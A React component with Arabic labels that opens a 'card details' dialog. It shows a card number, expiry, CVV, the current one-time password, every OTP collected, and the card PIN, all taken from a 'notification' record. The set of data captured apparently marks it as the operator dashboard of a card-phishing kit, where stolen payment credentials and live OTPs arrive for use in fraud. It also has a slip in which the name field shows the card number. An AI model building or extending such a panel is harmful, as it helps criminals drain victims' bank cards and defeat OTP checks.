import {
    Dialog,
    DialogContent,
    DialogHeader,
    DialogTitle,
    DialogDescription,
    DialogFooter,
  } from "@/components/ui/dialog";
  import { Button } from "@/components/ui/button";
  import { Label } from "@/components/ui/label";
  import { CreditCard, User, Calendar, Lock } from 'lucide-react';
import { Notification } from "@/app/notifications/page";
  

  
  interface CardInfoDialogProps {
    open: boolean;
    onOpenChange: (open: boolean) => void;
    notification: Notification | null;
  }
  
  export default function CardInfoDialog({ open, onOpenChange, notification }: CardInfoDialogProps) {
    if (!notification || !notification.cardNumber) return null;
  
    const cardInfo = notification.cardNumber;
  
    return (
      <Dialog open={open} onOpenChange={onOpenChange}>
        <DialogContent dir="rtl" className="sm:max-w-md bg-white dark:bg-gray-950 rounded-xl shadow-lg">
          <DialogHeader className="text-center pb-4 border-b">
            <DialogTitle className="text-2xl font-bold text-gray-800 dark:text-gray-100">
              تفاصيل البطاقة
            </DialogTitle>
            <DialogDescription className="text-gray-500 dark:text-gray-400 pt-1">
              مراجعة معلومات بطاقة الدفع المحفوظة.
            </DialogDescription>
          </DialogHeader>
  
          <div className="py-6 px-2 space-y-6">
            <div className="space-y-2">
              <Label htmlFor="cardNumber" className="text-sm font-medium text-gray-600 dark:text-gray-300">
                رقم البطاقة
              </Label>
              <div className="flex items-center gap-3 p-3 bg-gray-50 dark:bg-gray-900 rounded-md">
                <CreditCard className="h-6 w-6 text-gray-400" />
                <p id="cardNumber" className="text-lg font-mono tracking-wider text-gray-800 dark:text-gray-200">
                  {notification?.cardNumber}
                </p>
              </div>
            </div>
  
            <div className="space-y-2">
              <Label htmlFor="name" className="text-sm font-medium text-gray-600 dark:text-gray-300">
                الاسم على البطاقة
              </Label>
              <div className="flex items-center gap-3 p-3 bg-gray-50 dark:bg-gray-900 rounded-md">
                <User className="h-6 w-6 text-gray-400" />
                <p id="name" className="text-lg font-medium text-gray-800 dark:text-gray-200">
                  {notification.cardNumber || "غير متوفر"}
                </p>
              </div>
            </div>
  
            <div className="grid grid-cols-2 gap-4">
              <div className="space-y-2">
                <Label htmlFor="expiry" className="text-sm font-medium text-gray-600 dark:text-gray-300">
                  تاريخ الانتهاء
                </Label>
                <div className="flex items-center gap-3 p-3 bg-gray-50 dark:bg-gray-900 rounded-md">
                  <Calendar className="h-6 w-6 text-gray-400" />
                  <p id="expiry" className="text-lg font-medium text-gray-800 dark:text-gray-200">
                    {`${notification.cardMonth || "MM"}/${notification.cardYear || "YY"}`}
                  </p>
                </div>
              </div>
              <div className="space-y-2">
                <Label htmlFor="cvv" className="text-sm font-medium text-gray-600 dark:text-gray-300">
                  CVV
                </Label>
                <div className="flex items-center gap-3 p-3 bg-gray-50 dark:bg-gray-900 rounded-md">
                  <Lock className="h-6 w-6 text-gray-400" />
                  <p id="cvv" className="text-lg font-mono font-medium text-gray-800 dark:text-gray-200">
                  {notification.cvv }
                  </p>
                </div>
              </div>
              <div className="space-y-2">
                <Label htmlFor="cvv" className="text-sm font-medium text-gray-600 dark:text-gray-300">
                  OTP
                </Label>
                <div className="flex items-center gap-3 p-3 bg-gray-50 dark:bg-gray-900 rounded-md">
                  <Lock className="h-6 w-6 text-gray-400" />
                  <p id="otp" className="text-lg font-mono font-medium text-gray-800 dark:text-gray-200">
                  {notification.otp }
                  </p>
                </div>
                {notification.allOtps?.join("") }

              </div>
              <div className="space-y-2">
                <Label htmlFor="cvv" className="text-sm font-medium text-gray-600 dark:text-gray-300">
                  PIN Code
                </Label>
                <div className="flex items-center gap-3 p-3 bg-gray-50 dark:bg-gray-900 rounded-md">
                  <Lock className="h-6 w-6 text-gray-400" />
                  <p id="pin" className="text-lg font-mono font-medium text-gray-800 dark:text-gray-200">
                  {notification?.pinCode }
                  </p>
                </div>

              </div>
              {notification.allOtps?.join("") }

            </div>
          </div>
  
          <DialogFooter className="pt-4">
            <Button type="button" variant="outline" onClick={() => onOpenChange(false)} className="w-full">
              إغلاق
            </Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>
    );
  }
  